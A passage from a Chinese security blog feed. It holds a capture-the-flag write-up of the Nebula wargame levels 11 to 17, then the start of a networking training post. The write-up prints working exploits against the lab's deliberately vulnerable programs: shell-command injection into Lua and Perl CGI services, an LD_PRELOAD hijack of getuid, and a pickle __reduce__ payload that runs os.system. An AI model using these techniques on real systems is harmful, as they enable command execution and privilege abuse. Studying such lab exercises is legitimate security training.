stdin)</span>;</span><br><span class="line">          printf<span class="params">(<span class="string">"pink = %d\n"</span>, pink)</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span><span class="params">(pink &lt;= <span class="number">0</span>)</span> &#123;</span><br><span class="line">              err<span class="params">(<span class="number">1</span>, <span class="string">"fread fail(blue = %d, length = %d)"</span>, blue, length)</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          write<span class="params">(fd, buf, pink)</span>;</span><br><span class="line"></span><br><span class="line">          blue -= pink;</span><br><span class="line">      &#125;    </span><br><span class="line"></span><br><span class="line">      mem = mmap<span class="params">(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>)</span>;</span><br><span class="line">      <span class="keyword">if</span><span class="params">(mem == MAP_FAILED)</span> &#123;</span><br><span class="line">          err<span class="params">(<span class="number">1</span>, <span class="string">"mmap"</span>)</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      process<span class="params">(mem, length)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这题应该不是很难，能看懂代码应该就能解出来，贴下我的payload脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_w_file</span><span class="params">(content)</span>:</span></span><br><span class="line">	f = open(<span class="string">"payload"</span>, <span class="string">"w"</span>)</span><br><span class="line">	f.write(content)</span><br><span class="line">	f.close()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(command)</span>:</span></span><br><span class="line">	command += <span class="string">"\x00"</span></span><br><span class="line">	length = <span class="number">1024</span></span><br><span class="line">	count_length = length &amp; <span class="number">0xff</span></span><br><span class="line">	payload_command = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">		payload_command += chr((ord(x) ^ count_length) &amp; <span class="number">0xff</span>)</span><br><span class="line">		count_length -= ord(x)</span><br><span class="line">	payload_command += chr(count_length &amp; <span class="number">0xff</span>)</span><br><span class="line">	payload = <span class="string">"Content-Length: "</span> + str(length) + <span class="string">"\n"</span> + payload_command + <span class="string">"A"</span> * (length - len(payload_command) )</span><br><span class="line">	<span class="keyword">print</span> payload</span><br><span class="line">	<span class="comment">#my_w_file(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">		main(sys.argv[<span class="number">1</span>])</span><br><span class="line">		</span><br><span class="line"><span class="comment"># $ python payload.py whoami | /home/flag11/flag11</span></span><br><span class="line"><span class="comment"># level11</span></span><br><span class="line"><span class="comment"># (╯‵□′)╯︵┻━┻  这特么。。。不做了。。看了涛涛的博客，还有第二种更简单的方法，可是都不行。。。shit!</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Level12">Level12</h1><p>lua脚本的代码审计，好像是个后门脚本。。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> socket = <span class="built_in">require</span>(<span class="string">"socket"</span>)</span><br><span class="line"><span class="keyword">local</span> server = <span class="built_in">assert</span>(socket.bind(<span class="string">"127.0.0.1"</span>, <span class="number">50001</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span><span class="params">(password)</span></span></span><br><span class="line">  prog = <span class="built_in">io</span>.popen(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">  data = prog:read(<span class="string">"*all"</span>)</span><br><span class="line">  prog:close()</span><br><span class="line"></span><br><span class="line">  data = <span class="built_in">string</span>.sub(data, <span class="number">1</span>, <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> client = server:accept()</span><br><span class="line">  client:send(<span class="string">"Password: "</span>)</span><br><span class="line">  client:settimeout(<span class="number">60</span>)</span><br><span class="line">  <span class="keyword">local</span> line, err = client:receive()</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> err <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"trying "</span> .. line) <span class="comment">-- log from where ;\</span></span><br><span class="line">      <span class="keyword">local</span> h = hash(line)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> h ~= <span class="string">"4754a4f4bd5787accd33de887b9250a0691dd198"</span> <span class="keyword">then</span></span><br><span class="line">          client:send(<span class="string">"Better luck next time\n"</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          client:send(<span class="string">"Congrats, your token is 413**CARRIER LOST**\n"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  client:close()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
<p>这题你开着lua解释器试试就知道了。。问题在这行代码<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">prog</span> = io.popen(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">-- payload: 4754a4f4bd5787accd33de887b9250a0691dd198;<span class="title">getflag</span> &gt; /tmp/get ;<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>没有对password做任何过滤，导致命令执行。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level12<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>nc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">50001</span></span><br><span class="line"><span class="constant">Password:</span> <span class="number">4754</span>a4f4bd5787accd33de887b9250a0691dd198;getflag &gt; <span class="regexp">/tmp/get</span> ;<span class="comment">#</span></span><br><span class="line"><span class="constant">Congrats,</span> your token is <span class="number">413</span>**<span class="constant">CARRIER LOST*</span>*</span><br><span class="line">level12<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cat /tmp/get </span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>感觉nebula有问题。。。没能getshell成功</p>
<h1 id="Level13">Level13</h1><p>这题的C代码很简单<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> FAKEUID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="keyword">char</span> token[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(getuid() != FAKEUID) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Security failure detected. UID %d started us, we expect %d\n"</span>, getuid(), FAKEUID);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The system administrators will be notified of this violation\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// snip, sorry :)</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your token is %s\n"</span>, token);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码简单了，可是不会做了，看了涛涛的wp后，学到了许多新知识<br>前置知识点1:</p>
<blockquote>
<p>LD_PRELOAD：</p>
<p>在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入Unix操作系统不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 </p>
</blockquote>
<p>这题的思路就是劫持getuid函数 :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">myuid.c</span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="keyword">uid_t</span> getuid(<span class="keyword">void</span>) &#123;</span><br><span class="line">        <span class="comment">//system("getflag &gt; /tmp/getflag13"); getshell失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2: 编译动态链接库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>gcc -shared myuid.c -o myuid.so</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tLD_PRELOAD=/tmp/myuid</span>.so</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>export <span class="constant">LD_PRELOAD</span></span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cp /home/flag13/flag13 ./</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>./flag13</span><br><span class="line">your token is b705702b-<span class="number">76</span>a8-<span class="number">42</span>b<span class="number">0</span>-<span class="number">8844</span>-<span class="number">3</span>adabbe5ac58</span><br></pre></td></tr></table></figure></p>
<p>flag13和myuid.so的ruid要一样，所以把flag13 copy过来。</p>
<h1 id="Level14">Level14</h1><p>给一个加密程序，然后解密token文件。。。。这是小学的找规律？<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"857:g67?5ABBo:BtDA?tIvLDKL&#123;MQPSRQWW."</span></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="function"><span class="title">range</span><span class="params">(len(cipher)</span></span>):</span><br><span class="line">	plain += <span class="function"><span class="title">chr</span><span class="params">(ord(cipher[x])</span></span> - x)</span><br><span class="line">	</span><br><span class="line">print plain</span><br></pre></td></tr></table></figure></p>
<p>得到token后<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level14<span class="variable">@nebula</span><span class="symbol">:/home/flag14</span><span class="variable">$ </span>su flag14</span><br><span class="line"><span class="constant">Password:</span> </span><br><span class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br><span class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>whoami</span><br><span class="line">flag14</span><br></pre></td></tr></table></figure></p>
<h1 id="Level15">Level15</h1><p>暂无。。。前置技能没点够，LL的wp看不懂</p>
<h1 id="Level16">Level16</h1><p>perl代码审计<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="sub"><span class="keyword">sub</span> login &#123;</span></span><br><span class="line">  <span class="variable">$username</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$password</span> = <span class="variable">$_</span>[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$username</span> =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></span><br><span class="line">  <span class="variable">$username</span> =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">@output</span> = <span class="string">`egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> <span class="variable">$line</span> (<span class="variable">@output</span>) &#123;</span><br><span class="line">      (<span class="variable">$usr</span>, <span class="variable">$pw</span>) = <span class="keyword">split</span>(<span class="regexp">/:/</span>, <span class="variable">$line</span>);</span><br><span class="line">   </span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$pw</span> =~ <span class="variable">$password</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="sub"><span class="keyword">sub</span> htmlz &#123;</span></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_</span>[<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login was accepted&lt;br/&gt;"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login failed&lt;br/&gt;"</span>);</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">htmlz(login(param(<span class="string">"username"</span>), param(<span class="string">"password"</span>)));</span><br></pre></td></tr></table></figure></p>
<p>问题出在这句，命令执行<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@output = <span class="escape">`e</span>grep <span class="string">"^$username"</span> /home/flag16/userdb.txt <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="escape">`;</span></span><br></pre></td></tr></table></figure></p>
<p>然后在之前对变量 <code>$username</code>做了两次过滤<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></span><br><span class="line"><span class="variable">$username</span> =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></span><br></pre></td></tr></table></figure></p>
<p>一个是把所以字母变为大写，然后去掉空格后面的内容，可以这样测试 -&gt; 在shell中输入以下命令，<code>&lt;xxx&gt;</code> 为可控区域，也就是你能输入的地方<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ egrep <span class="string">"^&lt;xxx&gt;"</span> /home/flag16/userdb<span class="class">.txt</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>然后 <code>&lt;xxx&gt;</code> 里的内容不应该出现空格，因为空格后面的内容都会被过滤，然后所以字母都必须是大写的</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">level16@nebula:/tmp$ vim GET</span><br><span class="line">#!/bin/sh</span><br><span class="line">getflag &gt; /tmp/flag</span><br><span class="line">:wq</span><br><span class="line">level16@nebula:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line">level16@nebula:/tmp$ GET</span><br><span class="line">level16@nebula:/tmp$ cat /tmp/flag </span><br><span class="line">getflag is executing on a non-flag account, this doesn't count</span><br><span class="line"><span class="header">level16@nebula:/tmp$ rm /tmp/flag </span><br><span class="line">------------------</span></span><br><span class="line"><span class="header">$    curl nebula:1616/index.cgi?username=%60%2f%2a%2fget%60                         </span><br><span class="line">------------------</span></span><br><span class="line">level16@nebula:/tmp$ cat /tmp/flag </span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level17">Level17</h1><p>( ′ロ` )终于遇到我会的语言了。。。python代码审计<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import <span class="tag">time</span></span><br><span class="line">import socket</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">signal.<span class="function"><span class="title">signal</span><span class="params">(signal.SIGCHLD, signal.SIG_IGN)</span></span></span><br><span class="line"></span><br><span class="line">def <span class="function"><span class="title">server</span><span class="params">(skt)</span></span>:</span><br><span class="line">  line = skt.<span class="function"><span class="title">recv</span><span class="params">(<span class="number">1024</span>)</span></span></span><br><span class="line"></span><br><span class="line">  obj = pickle.<span class="function"><span class="title">loads</span><span class="params">(line)</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> obj:</span><br><span class="line">      clnt.<span class="function"><span class="title">send</span><span class="params">(<span class="string">"why did you send me "</span> + i + <span class="string">"?\n"</span>)</span></span></span><br><span class="line"></span><br><span class="line">skt = socket.<span class="function"><span class="title">socket</span><span class="params">(socket.AF_INET, socket.SOCK_STREAM, <span class="number">0</span>)</span></span></span><br><span class="line">skt.<span class="function"><span class="title">bind</span><span class="params">((<span class="string">'0.0.0.0'</span>, <span class="number">10007</span>)</span></span>)</span><br><span class="line">skt.<span class="function"><span class="title">listen</span><span class="params">(<span class="number">10</span>)</span></span></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  clnt, addr = skt.<span class="function"><span class="title">accept</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span><span class="params">(os.fork()</span></span> == <span class="number">0</span>):</span><br><span class="line">      clnt.<span class="function"><span class="title">send</span><span class="params">(<span class="string">"Accepted connection from %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>])</span></span>)</span><br><span class="line">      <span class="function"><span class="title">server</span><span class="params">(clnt)</span></span></span><br><span class="line">      <span class="function"><span class="title">exit</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>详情参加官方文档 [<a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="external">https://docs.python.org/2/library/pickle.html</a>]</p>
<p>问题出来pickle模块的loads方法，在如果dumps了一个object类型数据，则在loads时会执行其中的<strong>reduce</strong>方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level16.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">return</span> (os.system,(<span class="string">"getflag&gt;/tmp/flag16"</span>,))</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">a = pickle.dumps(ttt())</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="comment">#b = pickle.loads(a)</span></span><br></pre></td></tr></table></figure>
<p>可以自己在本地测试一下。。我的修炼还是不够啊。。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level16<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>python level16.py &gt; nc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">10007</span></span><br><span class="line"><span class="constant">Accepted </span>connection from <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">59058</span>^<span class="constant">C</span></span><br><span class="line">level16<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cat flag16</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>底层系统的水太深了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="PWN" scheme="http://0x48.pw/tags/PWN/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[12.19网络方向培训]]></title>
    <link href="http://0x48.pw/2015/12/19/0x0E/"/>
    <id>http://0x48.pw/2015/12/19/0x0E/</id>
    <published>2015-12-19T02:36:07.000Z</published>
    <updated>2016-03-28T10:21:26.590Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>
<a id="more"></a>
<h1 id="OSI七层模型(Open_System_Interconnect_开放系统互连参考模型)">OSI七层模型(Open System Interconnect 开放系统互连参考模型)</h1><p>国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型</p>
<p><img src="/img/osi.jpg" alt="osi"></p>
<h1 id="TCP/IP_协议族">TCP/IP 协议族</h1><p><img src="/img/TCPIP.png" alt="TCP/IP"></p>
<h2 id="协议">协议</h2><p>协议族</p>
<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-pro.png" alt="协议族"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import <span class="keyword">socket</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">s</span> = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET, <span class="keyword">socket</span>.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">add = (<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">bind</span>(add)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">listen</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	conn, addr = <span class="keyword">s</span>.<span class="keyword">accept</span>();</span><br><span class="line">	<span class="keyword">print</span> addr</span><br><span class="line">	buf = conn.<span class="keyword">recv</span>(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">print</span> buf</span><br><span class="line">	conn.sendall(<span class="string">"HTTP/1.1 200 OK\n\r\n\n"</span>)</span><br><span class="line">	conn.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>
<h2 id="端口">端口</h2><p>大小：16bits  (0-65535)</p>
<p>保留端口号：0-1024</p>
